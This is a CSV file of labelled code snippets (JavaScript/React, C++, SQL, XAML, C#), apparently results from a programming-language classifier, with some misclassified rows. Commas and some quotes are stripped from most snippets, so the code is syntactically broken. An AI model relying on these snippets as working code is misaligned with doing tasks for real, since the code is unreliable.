correct,guess,snippet
JavaScript,javascript,"import { Component } from '@angular/core';    @Component({      moduleId: module.id      selector: 'template-style'      templateUrl: 'app.component.template.html'      styles: ['strong{color:red;font-weight:bold}''strong{color:blue}']  })    export class TemplateUrlComponent {          constructor() {        }  }  "
JavaScript,javascript,"class App extends Component {  constructor() {    super();    this.state = {      order: {        id: ''        name : ''        email: ''        address: ''        phone: ''        units: ''      }     orderList: []        this.initialOrder = this.state.order;    }  }  ...}"
JavaScript,javascript," handleChange(name value) {    this.setState(      prevState => {         return(          {             order: { ...prevState.order [name]:value }           }        )      }    )  }  handleSubmit() {    this.setState(      prevState => {        return(        {          orderList: [...prevState.orderList prevState.order]          order: this.initialOrder        })      } () => {        this.props.history.push('/');              }    )  }  handleDelete(itemToBeDeleted) {     let updatedOrderList = this.state.orderList.filter(function(order) { return order.id !== itemToBeDeleted.id });    this.setState({      orderList: updatedOrderList    }) } resetOrderList() {    this.setState({      orderList: []    })  }"
JavaScript,javascript,"  render() {    return(      <div>       { this.props.history.location.pathname === '/'? this.renderTopButtons() : null }        <Switch>          <Route exact path=/ render={ () => <OrderTable {...this.props} orders = { this.state.orderList } onDelete = {this.handleDelete} /> } />          <Route path=/new render = { () => <CreateOrderForm {...this.props} onChange = {this.handleChange} onSubmit = {this.handleSubmit} /> } />        </Switch>                    </div>          );  }}"
JavaScript,javascript,"renderTopButtons() {    return(       <div className = container>        <div className = row col-md-8 offset-md-4   mt-4 mb-4>          <button className = btn btn-primary mx-2 onClick = { this.props.history.push('/new'); }> Create New Order </button>          <button className = btn btn-danger mx-2 onClick = { this.resetOrderList }> Delete All </button>        </div>      </div>)  }"
React,react,"const CreateOrderForm = (props) => { /*  Omitted for brevity */  return(    <div>        <br/>                <h2> Create an Order </h2>        <br/>        <form onSubmit  = {handleSubmit} onChange= {handleChange} >            <div>              <input name=id type=number id=example-number-input />            </div>                    <div>              <input name=name type=text id=example-text-input />            </div>                   <div>              <input name=email type=email id=example-email-input />            </div>                 <div>              <textarea name=address cols=50 rows=3 type=address />            </div>                  <div>              <input name=phone type=tel id=example-tel-input />            </div>                <div>             <input name=units type=number id=example-number-input />           </div>                  <div className=offset-md-4>             <button type=submit> Submit </button>           </div>      </form>     </div>    )}export default CreateOrderForm;"
C++,c++,"#include <cstdint>#include <algorithm>#include <numeric>#include <iterator>const size_t LEN = 1000000;// Increment For Loopuint64_t func1(){    uint64_t vec[LEN];    uint64_t sum = 0;    for (size_t i = 0; i < LEN; ++i)    {        sum += vec[i];    }    return sum;}// Range For Loopuint64_t func2(){    uint64_t vec[LEN];    uint64_t sum = 0;    for (auto n : vec)    {        sum += n;    }    return sum;}// Iterator For Loopuint64_t func3(){    uint64_t vec[LEN];    uint64_t sum = 0;    for (auto it = std::cbegin(vec); it != std::cend(vec); ++it)    {        sum += *it;    }    return sum;}// Accumulatoruint64_t func4(){    uint64_t vec[LEN];    uint64_t sum = 0;    const uint64_t Zero = 0;    sum = std::accumulate(std::cbegin(vec) std::cend(vec) Zero);    return sum;}"
SQL,sql,"WITH <em>CTE_SalesPerson (FirstName LastName SalesLastYear)</em>AS(   <strong>SELECT    TOP 10 FirstName             LastName             SalesLastYear   FROM      Sales.vSalesPerson   ORDER BY  SalesLastYear Asc</strong>)<u>SELECT   FirstName         LastName         SalesLastYearFROM     CTE_SalesPersonORDER BY LastName</u>"
SQL,sql,"SELECT personid       personname       birthdate       CAST(CONVERT(NVARCHAR(10) birthdate112)as INT) as BirthINT       CAST(CONVERT(NVARCHAR(10) birthdate112)as INT)+1 as BirthINTIncremented       CAST(CONVERT(NVARCHAR(10) birthdate112)as INT)+30 as BirthINTIncrementedMoreFROM   @datetable"
SQL,sql,"-- calculating the median using the converted String-- using a CTE to reference the conversion;WITH ctedateconversion AS (   SELECT personid          personname          birthdate          CONVERT( INT Birthdate) as BirthINT   FROM   @datetable)SELECT CONVERT(DATETIME               SUM(birthint)/(SELECT COUNT(*) FROM cteDateconversion)) As meanbirthdateFROM ctedateconversion"
SQL,sql,";with ctedateconversion as(   SELECT personid          PersonName          Birthdate          Percentile_Disc(0.5) within group (order by Birthdate) OVER() as MedianBirthDate   FROM   @datetable)SELECT personname       birthdateFROM   ctedateconversionWHERE  Birthdate = MedianBirthDate"
SQL,sql,"; with <strong>ctepresidents</strong> as(   SELECT President          Convert(DATETIME2 Birthdate) as Birthdate          Convert(DATETIME2 TermStart) TermStart          Convert(DATETIME2 TermEnd) as TermEnd   FROM Presidents)<strong>CTESTEP2</strong> as(   SELECT President          CAST(DATEDIFF(dd birthdate termstart)/365.0 as INT) as startage          CAST(DATEDIFF(dd birthdate termend)/365.0 as INT) as endage   FROM <strong>ctepresidents</strong>)<strong>ctefinal</strong> as(   SELECT   CAST(SUM(startage)/(select COUNT(*) FROM Ctestep2)as INT) as meanStartAge            CAST(SUM(endage)/(select COUNT(*) FROM Ctestep2)as INT )as meanendAge   FROM <strong>CTESTEP2</strong>)cteconnectingitall as(   SELECT President   FROM   <strong>CTESTEP2</strong> c          INNER JOIN <strong>CTEFINAL</strong> f          on c.startage = f.meanStartAge   UNION ALL   SELECT President   FROM   <strong>ctefinal</strong> ff          INNER JOIN <strong>CTESTEP2</strong> cc          ON cc.endage = ff.meanendAge)SELECT * FROM cteconnectingitall"
SQL,sql,";with ctepresidents as(   SELECT President          Convert(DATETIME2 Birthdate) as Birthdate          Convert(DATETIME2 TermStart) TermStart          Convert(DATETIME2 TermEnd) as TermEnd   FROM   Presidents)CTESTEP2 as(   SELECT President          CAST(DATEDIFF(dd birthdate termstart)/365.0 as INT) as startage          CAST(DATEDIFF(dd birthdate termend)/365.0 as INT) as endage   FROM ctepresidents)SELECT * FROM CTESTEP2WHERE  startage = 54       OR endage = 59"
SQL,sql,"SELECT E.BusinessEntityID       D.GroupName       H.EndDate       E.MaritalStatus       E.Gender       P.Rate       P.PayFrequency       P.RateChangeDate       P.Rate * 40 * 52 / P.PayFrequency as AnnualPayFROM   HumanResources.Employee E       INNER JOIN HumanResources.EmployeePayHistory P ON                  E.BusinessEntityID = p.BusinessEntityID       INNER JOIN HumanResources.EmployeeDepartmentHistory H ON                  E.BusinessEntityID = H.BusinessEntityID       INNER JOIN HumanResources.Department D ON                  H.DepartmentID = D.DepartmentIDWHERE  E.CurrentFlag = 1;"
SQL,sql,"With cte_EmployeePay as(   SELECT E.BusinessEntityID          D.GroupName          H.EndDate          E.MaritalStatus          E.Gender          P.Rate          P.PayFrequency          P.RateChangeDate          P.Rate * 40 * 52 / P.PayFrequency as AnnualPay          ROW_NUMBER() OVER(PARTITION BY E.BusinessEntityID                       ORDER BY P.RateChangeDate Desc) RowNumber   FROM   HumanResources.Employee E          INNER JOIN HumanResources.EmployeePayHistory P ON                     E.BusinessEntityID = p.BusinessEntityID          INNER JOIN HumanResources.EmployeeDepartmentHistory H ON                     E.BusinessEntityID = H.BusinessEntityID                     AND H.EndDate is NULL          INNER JOIN HumanResources.Department D ON                     H.DepartmentID = D.DepartmentID   WHERE  E.CurrentFlag = 1)SELECT *FROM   cte_EmployeePayWHERE  RowNumber = 1;"
SQL,sql,"With cte_EmployeePay as(   SELECT D.GroupName          IIF(E.MaritalStatus = 'M''Married''Single') + '-' +           IIF(E.Gender = 'M' 'Male' 'Female') as LifeStatus          P.Rate * 40 * 52 / P.PayFrequency as AnnualPay          ROW_NUMBER() OVER(PARTITION BY E.BusinessEntityID                       ORDER BY P.RateChangeDate Desc) RowNumber   FROM   HumanResources.Employee E          INNER JOIN HumanResources.EmployeePayHistory P ON                     E.BusinessEntityID = p.BusinessEntityID          INNER JOIN HumanResources.EmployeeDepartmentHistory H ON                     E.BusinessEntityID = H.BusinessEntityID                     AND H.EndDate is NULL          INNER JOIN HumanResources.Department D ON                     H.DepartmentID = D.DepartmentID   WHERE  E.CurrentFlag = 1)SELECT *FROM   (SELECT GroupName               LifeStatus               AnnualPay        FROM   cte_EmployeePay        WHERE  RowNumber = 1) as SourceTablePIVOT(   Avg(AnnualPay)   FOR LifeStatus IN ([Married-Male]                      [Married-Female]                      [Single-Male]                      [Single-Female])) AS AvgSalesORDER BY GroupName"
SQL,sql,"SELECT   REPLACE(REPLACE(P.PartNumber'*''-') ' ''-') as PartNumber         P.NAme         S.Year         S.SalesFROM     @PartDescription P         INNER JOIN @PartSales S          ON REPLACE(REPLACE(P.PartNumber'*''-') ' ''-') =          REPLACE(REPLACE(S.PartNumber'*''-') ' ''-')ORDER BY P.Name S.Year"
SQL,sql,"SELECT   REPLACE(REPLACE(P.PartNumber'*''-') ' ''-') as PartNumber         P.NAme         S.Year         S.SalesFROM     @PartDescription P         INNER JOIN @PartSales S          ON TRANSLATE(P.PartNumber'!@#$%^&*()_+=''-------------') =          TRANSLATE(S.PartNumber '!@#$%^&*()_+=''-------------')ORDER BY P.Name S.Year"
SQL,sql,"SELECT   REPLACE(REPLACE(P.PartNumber'*''-') ' ''-') as PartNumber         P.NAme         S.Year         S.SalesFROM     @PartDescription P         INNER JOIN @PartSales S         ON LEFT(P.PartNumber4) = LEFT(S.PartNumber4) AND         RIGHT(P.PartNumber4) = RIGHT(S.PartNumber4)ORDER BY P.Name S.Year"
SQL,sql,"SELECT   T1.InvoiceID         T2.InvoiceID         T1.TransactionDate         T1.TransactionAmount         T2.TransactionAmountFROM     Sales.CustomerTransactions T1         INNER JOIN Sales.CustomerTransactions T2         ON <strong>T1.InvoiceID >= T2.InvoiceID</strong>         AND  <em>T1.TransactionDate = T2.TransactionDate</em>WHERE    T1.TransactionTypeID = 1ORDER BY T1.InvoiceID T1.TransactionAmount"
SQL,sql,"SELECT   T1.InvoiceID         T1.TransactionDate         T1.TransactionAmount         Sum(T2.TransactionAmount) RunningTotalFROM     Sales.CustomerTransactions T1         INNER JOIN Sales.CustomerTransactions T2         ON T1.InvoiceID >= T2.InvoiceID         AND  T1.TransactionDate = T2.TransactionDateWHERE    T1.TransactionTypeID = 1GROUP BY <strong>T1</strong><strong>.</strong><strong>InvoiceID</strong><strong>         </strong><strong></strong><strong>T1</strong><strong>.</strong><strong>TransactionDate</strong><strong>         </strong><strong></strong><strong>T1</strong><strong>.</strong><strong>TransactionAmount</strong>ORDER BY T1.InvoiceID         T1.TransactionAmount"
SQL,sql,"SELECT   InvoiceID         TransactionDate         TransactionAmount         SUM(TransactionAmount) OVER(PARTITION BY TransactionDate) RunningTotalFROM     Sales.CustomerTransactions T1WHERE    TransactionTypeID = 1ORDER BY InvoiceID         TransactionAmount"
SQL,sql,"SELECT   InvoiceID         TransactionDate         TransactionAmount         SUM(TransactionAmount) OVER(PARTITION BY TransactionDate ORDER BY InvoiceID) RunningTotalFROM     Sales.CustomerTransactions T1WHERE    TransactionTypeID = 1ORDER BY InvoiceID         TransactionAmount"
SQL,sql,"SELECT U.Name       U.PhoneNumber       UH.actionDate AS RecentLogonDateFROM   @User AS U       INNER JOIN @UserHistory AS UH       ON U.userID = UH.userIDWHERE  action = 'Logged On'       AND DATEDIFF(DAY actionDate '2017-03-14') <= 30;"
SQL,sql,"SELECT   U.Name         U.PhoneNumber         MAX(UH.actionDate) AS RecentLogonDateFROM     @User AS U         INNER JOIN @UserHistory AS UH         ON U.userID = UH.userIDWHERE    action = 'Logged On'         AND DATEDIFF(DAY actionDate '2017-03-14') <= 30GROUP BY U.Name U.phoneNumber;"
SQL,sql,"SELECT U.Name       U.PhoneNumberFROM   @User AS UWHERE  U.UserID IN (SELECT UserID                    FROM   @UserHistory                    WHERE  action = 'Logged On'                    AND DATEDIFF(DAY actionDate '2017-03-14') <= 30);"
SQL,sql,"SELECT U.Name       U.PhoneNumber       (SELECT Max(UH.actionDate)        FROM   @UserHistory AS UH        WHERE  action = 'Logged On'        AND DATEDIFF(DAY actionDate '2017-03-14') <= 30AND    U.userID = UH.userID) AS RecentLogonDateFROM   @User AS UWHERE  DATEDIFF(DAY <strong>RecentLogonDate</strong> '2017-03-14') <= 30       AND <strong>RecentLogonDate IS NOT NULL</strong>"
SQL,sql,"SELECT U.Name       U.PhoneNumber       (SELECT Max(UH.actionDate)        FROM   @UserHistory AS UH        WHERE  action = 'Logged On'               AND DATEDIFF(DAY actionDate '2017-03-14') <= 30               AND <strong>U.userID = UH.userID</strong>) AS RecentLogonDateFROM   @User AS UWHERE  U.UserID IN (SELECT UserID                    FROM   @UserHistory                    WHERE  action = 'Logged On'                    AND DATEDIFF(DAY actionDate '2017-03-14') <= 30);"
SQL,sql,"SELECT   E.HireDate         (SELECT FirstName          FROM   Person.Person P1          WHERE  P1.BusinessEntityID = E.BusinessEntityID)         (SELECT LastName          FROM   Person.Person P2          WHERE  P2.BusinessEntityID = E.BusinessEntityID)         E.BirthDateFROM     HumanResources.Employee EWHERE    (SELECT PersonType          FROM   Person.Person T          WHERE  T.BusinessEntityID = E.BusinessEntityID) = 'EM'ORDER BY HireDate         (SELECT FirstName          FROM   Person.Person P1          WHERE  P1.BusinessEntityID = E.BusinessEntityID)"
SQL,sql,"SELECT   E.HireDate         (SELECT FirstName          FROM   Person.Person P1          WHERE  <strong>P1.BusinessEntityID = E.BusinessEntityID</strong>)         (SELECT LastName          FROM   Person.Person P2          WHERE  <strong>P2.BusinessEntityID = E.BusinessEntityID</strong>)         E.BirthDateFROM     HumanResources.Employee EWHERE    (SELECT PersonType          FROM   Person.Person T          WHERE  <strong>T.BusinessEntityID = E.BusinessEntityI</strong>D) = 'EM'ORDER BY HireDate         (SELECT FirstName          FROM   Person.Person P1          WHERE  <strong>P1.BusinessEntityID = E.BusinessEntityID</strong>)"
SQL,sql,"SELECT   E.HireDate         P.FirstName         P.LastName         E.BirthDateFROM     HumanResources.Employee E         INNER JOIN Person.Person P         ON P.BusinessEntityID = E.BusinessEntityIDWHERE    P.PersonType  = 'EM'ORDER BY E.HireDate         P.FirstName"
SQL,sql,"SET SHOWPLAN_ALL ONSELECT   E.HireDate         P.FirstName         P.LastName         E.BirthDateFROM     HumanResources.Employee E         INNER JOIN Person.Person P         ON P.BusinessEntityID = E.BusinessEntityIDWHERE    P.PersonType  = 'EM'ORDER BY E.HireDate         P.FirstName"
VB.NET,c#,"' Define center originDim ptCenter As PointF = _      New PointF(_rcRect.Left + (_rcRect.Width / 2) _rcRect.Top + (_rcRect.Height / 2))' Check for on-going resize operationSelect Case _eMouseOperation    Case MouseOperation.Nwse To MouseOperation.We        ' Use last known center origin        ptCenter = _ptCenter    Case Else        _ptCenter = ptCenterEnd Select"
VB.NET,vb.net,"' Check for rotationIf (_rgRect IsNot Nothing) AndAlso (_snAngle <> 0.0) Then    ' Get rotatetd rectangle bounds    Dim rfNewBounds As RectangleF = _rgRect.GetBounds(oGfx)    ' Check for resize operation on a rotated element    If (_eMouseOperation >= MouseOperation.Nwse) AndAlso _eMouseOperation <= MouseOperation.We Then        ' Get center origin of the region        Dim ptNewScreenCenterOrigin As New PointF_          (rfNewBounds.Left + (rfNewBounds.Width / 2) rfNewBounds.Top + (rfNewBounds.Height / 2))        ' Compute a rectangle based on source rectangle size and located around the center point        ' of the bounds of the rotated region        Dim rcNewRenderRect As New RectangleF((ptNewScreenCenterOrigin.X - (_rcRect.Width / 2)) _                                              (ptNewScreenCenterOrigin.Y - (_rcRect.Height / 2)) _                                              _rcRect.Width _                                              _rcRect.Height)        ' Store for mouse up        _rcResizeMouseUpRenderRect = rcNewRenderRect    End IfEnd If"
C++,c++,"void intersection_example(){    std::vector<int> v1{ 12345678 };    std::vector<int> v2{         5  7  910 };    std::sort(v1.begin() v1.end());    std::sort(v2.begin() v2.end());    std::vector<int> v_intersection;    std::set_intersection(v1.begin() v1.end()        v2.begin() v2.end()        std::back_inserter(v_intersection));    for (int n : v_intersection)        std::cout << n << ' ';}"
C++,c++,"void intersection_example(){    std::vector<int> v1{ 12345678 };    std::vector<int> v2{         5  7  910 };    std::vector<int> v_intersection = s(v1) & s(v2);    for (int n : v_intersection)        std::cout << n << ' ';}"
C++,c++,"#include <algorithm>#include <iterator>template<typename T>struct wrapper{    wrapper(T& container) : cont(container) {}    T& cont;};template<typename T>wrapper<T> s(T& s_cont){    return wrapper<T>(s_cont);}"
C++,c++,"template<typename T>T operator&(wrapper<T>& left wrapper<T>& right){    T& c1 = left.cont;    T& c2 = right.cont;    if (!std::is_sorted(c1.begin() c1.end()))        std::sort(c1.begin() c1.end());    if (!std::is_sorted(c2.begin() c2.end()))        std::sort(c2.begin() c2.end());    T v_intersection;    std::set_intersection(c1.begin() c1.end()        c2.begin() c2.end()        std::back_inserter(v_intersection));    return std::move(v_intersection);}"
C++,c++,"void union_example(){    std::vector<int> v1 = { 1 2 3 4 5 };    std::vector<int> v2 = {       3 4 5 6 7 };    std::sort(v1.begin() v1.end());    std::sort(v2.begin() v2.end());    std::vector<int> dest1;    std::set_union(v1.begin() v1.end()        v2.begin() v2.end()        std::back_inserter(dest1));    for (const auto &i : dest1) {        std::cout << i << ' ';    }    std::cout << '\n';}"
C++,c++,"void union_example(){    std::vector<int> v1 = { 1 2 3 4 5 };    std::vector<int> v2 = {       3 4 5 6 7 };    std::vector<int> dest1 = s(v1) | s(v2);    for (int n : dest1)        std::cout << n << ' ';}"
C++,c++,"template<typename T>T operator|(wrapper<T>& left wrapper<T>& right){    T& c1 = left.cont;    T& c2 = right.cont;    if (!std::is_sorted(c1.begin() c1.end()))        std::sort(c1.begin() c1.end());    if (!std::is_sorted(c2.begin() c2.end()))        std::sort(c2.begin() c2.end());    T dest1;    std::set_union(c1.begin() c1.end()        c2.begin() c2.end()        std::back_inserter(dest1));    return std::move(dest1);}"
C++,c++,"void set_difference_example() {    std::vector<int> v1{ 1 2 5 5 5    9 };    std::vector<int> v2{    2 5       7 };    std::sort(v1.begin() v1.end());    std::sort(v2.begin() v2.end());    std::vector<int> diff;    std::set_difference(v1.begin() v1.end() v2.begin() v2.end()        std::inserter(diff diff.begin()));    for (auto i : v1) std::cout << i << ' ';    std::cout << minus ;    for (auto i : v2) std::cout << i << ' ';    std::cout << is: ;    for (auto i : diff) std::cout << i << ' ';    std::cout << '\n';}"
C++,c++,"void set_difference_example(){    std::vector<int> v1{ 1 2 5 5 5 9 };    std::vector<int> v2{    2 5       7 };    std::vector<int> diff = s(v1) - s(v2);    for (auto i : v1) std::cout << i << ' ';    std::cout << minus ;    for (auto i : v2) std::cout << i << ' ';    std::cout << is: ;    for (auto i : diff) std::cout << i << ' ';    std::cout << '\n';}"
C++,c++,"template<typename T>T operator-(wrapper<T>& left wrapper<T>& right){    T& c1 = left.cont;    T& c2 = right.cont;    if (!std::is_sorted(c1.begin() c1.end()))        std::sort(c1.begin() c1.end());    if (!std::is_sorted(c2.begin() c2.end()))        std::sort(c2.begin() c2.end());    T diff;    std::set_difference(c1.begin() c1.end()        c2.begin() c2.end()        std::back_inserter(diff));    return std::move(diff);}"
C++,c++,"void set_symmetric_difference_example(){    std::vector<int> v1{ 12345678 };    std::vector<int> v2{         5  7  910 };    std::sort(v1.begin() v1.end());    std::sort(v2.begin() v2.end());    std::vector<int> v_symDifference;    std::set_symmetric_difference(        v1.begin() v1.end()        v2.begin() v2.end()        std::back_inserter(v_symDifference));    for (int n : v_symDifference)        std::cout << n << ' ';}"
C++,c++,"void set_symmetric_difference_example(){    std::vector<int> v1{ 12345678 };    std::vector<int> v2{         5  7  910 };    std::vector<int> v_symDifference = s(v1) ^ s(v2);    for (int n : v_symDifference)        std::cout << n << ' ';}"
C++,c++,"template<typename T>T operator^(wrapper<T>& left wrapper<T>& right){    T& c1 = left.cont;    T& c2 = right.cont;    if (!std::is_sorted(c1.begin() c1.end()))        std::sort(c1.begin() c1.end());    if (!std::is_sorted(c2.begin() c2.end()))        std::sort(c2.begin() c2.end());    T v_symDifference;    std::set_symmetric_difference(c1.begin() c1.end()        c2.begin() c2.end()        std::back_inserter(v_symDifference));    return std::move(v_symDifference);}"
C++,c++,"void is_superset_example(){    std::vector<char> v1{ 'a' 'b' 'c' 'f' 'h' 'x' };    std::vector<char> v2{ 'a' 'b' 'c' };    std::vector<char> v3{ 'a' 'c' };    std::vector<char> v4{ 'g' };    std::vector<char> v5{ 'a' 'c' 'g' };    std::sort(v1.begin() v1.end());    std::sort(v2.begin() v2.end());    std::sort(v3.begin() v3.end());    std::sort(v4.begin() v4.end());    std::sort(v5.begin() v5.end());    for (auto i : v1) std::cout << i << ' ';    std::cout << \nincludes:\n << std::boolalpha;    for (auto i : v2) std::cout << i << ' ';    std::cout << :                << std::includes(v1.begin() v1.end() v2.begin() v2.end()) << '\n';    for (auto i : v3) std::cout << i << ' ';    std::cout << :                << std::includes(v1.begin() v1.end() v3.begin() v3.end()) << '\n';    for (auto i : v4) std::cout << i << ' ';    std::cout << :                << std::includes(v1.begin() v1.end() v4.begin() v4.end()) << '\n';    for (auto i : v5) std::cout << i << ' ';    std::cout << :                << std::includes(v1.begin() v1.end() v5.begin() v5.end()) << '\n';    auto cmp_nocase = [](char a char b) {        return std::tolower(a) < std::tolower(b);    };    std::vector<char> v6{ 'A' 'B' 'C' };    for (auto i : v6) std::cout << i << ' ';    std::cout << : (case-insensitive)         << std::includes(v1.begin() v1.end() v6.begin() v6.end() cmp_nocase)        << '\n';}"
C++,c++,"void is_superset_example(){    std::vector<char> v1{ 'a' 'b' 'c' 'f' 'h' 'x' };    std::vector<char> v2{ 'a' 'b' 'c' };    std::vector<char> v3{ 'a' 'c' };    std::vector<char> v4{ 'g' };    std::vector<char> v5{ 'a' 'c' 'g' };    for (auto i : v1) std::cout << i << ' ';    std::cout << \nincludes:\n << std::boolalpha;    for (auto i : v2) std::cout << i << ' ';    std::cout << :  << (s(v1) >= s(v2)) << '\n';    for (auto i : v3) std::cout << i << ' ';    std::cout << :  << (s(v1) >= s(v3)) << '\n';    for (auto i : v4) std::cout << i << ' ';    std::cout << :  << (s(v1) >= s(v4)) << '\n';    for (auto i : v5) std::cout << i << ' ';    std::cout << :  << (s(v1) >= s(v5)) << '\n';    auto cmp_nocase = [](char a char b) {        return std::tolower(a) < std::tolower(b);    };    std::vector<char> v6{ 'A' 'B' 'C' };    for (auto i : v6) std::cout << i << ' ';    std::cout << : (case-insensitive)         << std::includes(v1.begin() v1.end() v6.begin() v6.end() cmp_nocase)        << '\n';}"
C++,c++,"// Returns true if left is superset of right?template<typename T>bool operator>=(wrapper<T>& left wrapper<T>& right){    T& c1 = left.cont;    T& c2 = right.cont;    if (!std::is_sorted(c1.begin() c1.end()))        std::sort(c1.begin() c1.end());    if (!std::is_sorted(c2.begin() c2.end()))        std::sort(c2.begin() c2.end());    return std::includes(        c1.begin() c1.end()        c2.begin() c2.end());}// Returns true if left is subset of right?template<typename T>bool operator<=(wrapper<T>& left wrapper<T>& right){    T& c1 = left.cont;    T& c2 = right.cont;    if (!std::is_sorted(c1.begin() c1.end()))        std::sort(c1.begin() c1.end());    if (!std::is_sorted(c2.begin() c2.end()))        std::sort(c2.begin() c2.end());    return std::includes(        c2.begin() c2.end()        c1.begin() c1.end());}"
XML,xml,"<Page.BottomAppBar>  <CommandBar>     <AppBarButton Icon=Like Label=Like />     <AppBarButton Icon=Message Label=Message />     <AppBarButton Icon=OpenFile Label=Open File />     <AppBarToggleButton Icon=Accept Label=Accept />  </CommandBar></Page.BottomAppBar>"
XML,html,"<AppBarButton Icon=OpenFile Label=Open File >  <FlyoutBase.AttachedFlyout>     <Flyout>        <TextBlock Text=This is some text in a flyout.  />     </Flyout>          </FlyoutBase.AttachedFlyout></AppBarButton>"
XML,xml,"       <StackPanel>       <Slider x:Name=rectSizeSlider Header=RectangleSize Minimum=1               Maximum=100               Value=20 Width=200 />       <Rectangle x:Name=DarkBlueRect Fill=DarkBlue Width=10 Height=10/>       </StackPanel>"
XML,xml,"<Grid.RowDefinitions>  <RowDefinition Height=*/>  <RowDefinition Height=*/></Grid.RowDefinitions><Grid.ColumnDefinitions>  <ColumnDefinition Width=*/>  <ColumnDefinition Width=*/></Grid.ColumnDefinitions>"
XML,xml,"<StackPanel>  <ToggleSwitch Header=ToggleSwitch HorizontalAlignment=Stretch      VerticalAlignment=Stretch/>         <ToggleButton Content=ToggleButton HorizontalAlignment=Stretch            VerticalAlignment=Stretch/>         <TextBox TextWrapping=Wrap Text=TextBox/>         <PasswordBox  />         <TextBox TextWrapping=Wrap Text=TextBox/>   </StackPanel>"
XML,xml,"<StackPanel>  <ToggleSwitch Header=Contact Me HorizontalAlignment=Stretch     VerticalAlignment=Stretch/>  <ToggleButton Content=Alert Me HorizontalAlignment=Stretch     VerticalAlignment=Stretch/>  <TextBox Header=First name: TextWrapping=Wrap Text=TextBox/>  <PasswordBox Header=Password: />  <TextBox Header=Last name: TextWrapping=Wrap Text=TextBox/></StackPanel>"
XML,xml,"       <Border BorderBrush=Green BorderThickness=5 Grid.Row=0 Grid.Column=1>           <ScrollViewer>               <StackPanel>                             </StackPanel>           </ScrollViewer>       </Border>"
XML,xml,"<Border BorderBrush=Green BorderThickness=5 Grid.Row=0 Grid.Column=1>           <ScrollViewer>               <StackPanel>                   <ComboBox x:Name=PriceComboBox Header=Price Width=150                             HorizontalAlignment=Left  VerticalAlignment=Top                             Margin=20 SelectionChanged=ComboBox_SelectionChanged>                       <x:String>4.39</x:String>                       <x:String>5.68</x:String>                       <x:String>7.02</x:String>                   </ComboBox>                   <StackPanel >                       <CheckBox x:Name=AddFeeCheckBox  Margin=20 3 3 3                             Content=Add Fee ($5.00) Click=AddFeeCheckBox_Click />                       <CheckBox x:Name=AddTaxesCheckBox Margin=20 3 3 3                            Content=Include Taxes (x 7.5%) Click=AddTaxesCheckBox_Click />                   </StackPanel>                   <StackPanel>                       <RadioButton x:Name=AlignLeftRadio IsChecked=True                            Content=Align Left Margin=20 3 3 3 Checked=RadioButton_Checked/>                       <RadioButton x:Name=AlignCenterRadio                            Content=Align Center Margin=20 3 3 3 Checked=RadioButton_Checked/>                       <RadioButton x:Name=AlignRightRadio                            Content=Align Right Margin=20 3 3 3 Checked=RadioButton_Checked/>                   </StackPanel>                   <StackPanel>                       <TextBox x:Name=FinalCostTextBox PlaceholderText=final cost                             HorizontalAlignment=Left  Width=250/>                   </StackPanel>               </StackPanel>           </ScrollViewer>       </Border>"
XML,xml,"<ItemsControl ItemsSource={Binding ScrollBarVm1.DisplayFiles}>    <ItemsControl.ItemsPanel>        <ItemsPanelTemplate>            <UniformGrid  Columns={Binding ScrollBarVm1.NGridX} Rows={Binding ScrollBarVm1.NGridY}/>        </ItemsPanelTemplate>    </ItemsControl.ItemsPanel>     <ItemsControl.ItemTemplate>        <DataTemplate>            <Image Source={Binding Image} Stretch=Uniform HorizontalAlignment=Center>                <Image.ToolTip>                     <StackPanel Orientation=Vertical>                        <Image Source={Binding Image}                          Stretch=Uniform Height=600/>                        <TextBlock Text={Binding Comment} />                    </StackPanel>                </Image.ToolTip>            </Image>        </DataTemplate>    </ItemsControl.ItemTemplate></ItemsControl>"
C#,c#,"public static void WriteXmlToFile(string filename ISolutionModel rootModel){  XmlWriter xmlWriter = null;  try  {    var fileStream = new FileStream(filename FileMode.Create);    xmlWriter = XmlWriter.Create(fileStream new XmlWriterSettings    {        Indent = true        IndentChars =           CloseOutput = true    });    var dataContractSerializer = new DataContractSerializer(typeof(SolutionModel));    dataContractSerializer.WriteObject(xmlWriter rootModel);  }  finally  {    if (xmlWriter != null)        xmlWriter.Close();  }}"
SQL,sql,"CREATE DATABASE [Sample] ON  PRIMARY( NAME = N'Sample_dat' FILENAME = N'D:\Sample\Sample.mdf'  SIZE = 13760KB  MAXSIZE = UNLIMITED FILEGROWTH = 10%) LOG ON( NAME = N'Sample_log' FILENAME = N'D:\Sample\Sample.ldf'  SIZE = 9216KB  MAXSIZE = UNLIMITED FILEGROWTH = 10%)GO"
